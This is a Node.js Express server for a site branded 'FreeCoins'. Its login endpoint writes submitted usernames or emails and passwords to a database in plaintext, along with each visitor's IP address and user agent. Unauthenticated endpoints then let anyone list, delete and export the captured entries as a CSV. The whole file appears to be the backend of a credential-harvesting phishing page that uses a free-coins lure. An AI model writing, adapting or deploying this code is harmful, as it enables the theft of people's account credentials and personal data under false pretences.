const express = require('express');
const cors = require('cors');
const path = require('path');
const { addSubmission, getAllSubmissions, deleteSubmission, clearAllSubmissions } = require('./database');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static frontend files from current directory
app.use(express.static(__dirname));

/**
 * Endpoint: POST /api/login
 * Save user credentials and metadata into the SQLite database
 */
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({
                success: false,
                message: 'Username/Email and Password are required.'
            });
        }

        // Capture client details
        const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
        const userAgent = req.headers['user-agent'] || 'Unknown';

        const result = await addSubmission({
            username: username.trim(),
            password: password.trim(),
            ipAddress,
            userAgent
        });

        console.log(`[DB] Saved new entry ID #${result.id}: ${username}`);

        return res.status(201).json({
            success: true,
            message: 'Details stored successfully in database.',
            data: {
                id: result.id,
                username: result.username,
                created_at: new Date().toISOString()
            }
        });
    } catch (error) {
        console.error('Error saving submission:', error);
        return res.status(500).json({
            success: false,
            message: 'Internal server error while saving data.'
        });
    }
});

/**
 * Endpoint: GET /api/submissions
 * Fetch all stored submissions (for admin dashboard)
 */
app.get('/api/submissions', async (req, res) => {
    try {
        const rows = await getAllSubmissions();
        return res.json({
            success: true,
            count: rows.length,
            data: rows
        });
    } catch (error) {
        console.error('Error fetching submissions:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to retrieve database submissions.'
        });
    }
});

/**
 * Endpoint: DELETE /api/submissions/:id
 * Delete a single submission by ID
 */
app.delete('/api/submissions/:id', async (req, res) => {
    try {
        const id = req.params.id;
        const result = await deleteSubmission(id);
        if (!result.deleted) {
            return res.status(404).json({ success: false, message: 'Submission not found.' });
        }
        return res.json({ success: true, message: `Submission #${id} deleted.` });
    } catch (error) {
        console.error('Error deleting submission:', error);
        return res.status(500).json({ success: false, message: 'Failed to delete submission.' });
    }
});

/**
 * Endpoint: DELETE /api/submissions
 * Clear all submissions
 */
app.delete('/api/submissions', async (req, res) => {
    try {
        const result = await clearAllSubmissions();
        return res.json({
            success: true,
            message: `Cleared ${result.clearedCount} submissions.`
        });
    } catch (error) {
        console.error('Error clearing submissions:', error);
        return res.status(500).json({ success: false, message: 'Failed to clear submissions.' });
    }
});

/**
 * Endpoint: GET /api/export/csv
 * Export submissions directly as CSV download
 */
app.get('/api/export/csv', async (req, res) => {
    try {
        const rows = await getAllSubmissions();
        
        let csv = 'ID,Username/Email,Password,IP Address,User Agent,Date/Time\r\n';
        rows.forEach(r => {
            const escapedUser = `"${(r.username || '').replace(/"/g, '""')}"`;
            const escapedPass = `"${(r.password || '').replace(/"/g, '""')}"`;
            const escapedIp = `"${(r.ip_address || '').replace(/"/g, '""')}"`;
            const escapedUa = `"${(r.user_agent || '').replace(/"/g, '""')}"`;
            const escapedDate = `"${(r.created_at || '').replace(/"/g, '""')}"`;
            csv += `${r.id},${escapedUser},${escapedPass},${escapedIp},${escapedUa},${escapedDate}\r\n`;
        });

        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', 'attachment; filename="database_submissions.csv"');
        return res.send(csv);
    } catch (error) {
        console.error('Error exporting CSV:', error);
        return res.status(500).send('Failed to export CSV');
    }
});

// Start Server
app.listen(PORT, () => {
    console.log(`=========================================`);
    console.log(`🚀 FreeCoins Server & Database is active!`);
    console.log(`🌐 Website: http://localhost:${PORT}`);
    console.log(`📊 Admin Panel: http://localhost:${PORT}/admin.html`);
    console.log(`=========================================`);
});
